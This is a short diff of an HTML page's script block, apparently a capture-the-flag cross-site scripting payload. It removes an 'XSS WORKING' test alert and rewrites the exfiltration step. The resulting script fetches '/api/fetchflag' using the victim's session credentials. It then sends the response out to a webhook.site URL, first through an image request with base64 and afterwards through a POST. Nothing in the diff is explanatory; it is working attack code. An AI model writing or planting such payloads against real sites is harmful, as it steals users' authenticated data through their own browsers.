@@ -3,12 +3,13 @@
 <body>
 
 <script>
-alert("XSS WORKING");
-
 fetch('/api/fetchflag', {credentials: 'include'})
 .then(r => r.text())
 .then(d => {
-  new Image().src = "https://webhook.site/d424e8a3-11b3-4ece-a53d-dc80a5cc995b?flag=" + btoa(d);
+  fetch('https://webhook.site/d424e8a3-11b3-4ece-a53d-dc80a5cc995b', {
+    method: 'POST',
+    body: d
+  });
 });
 </script>
 
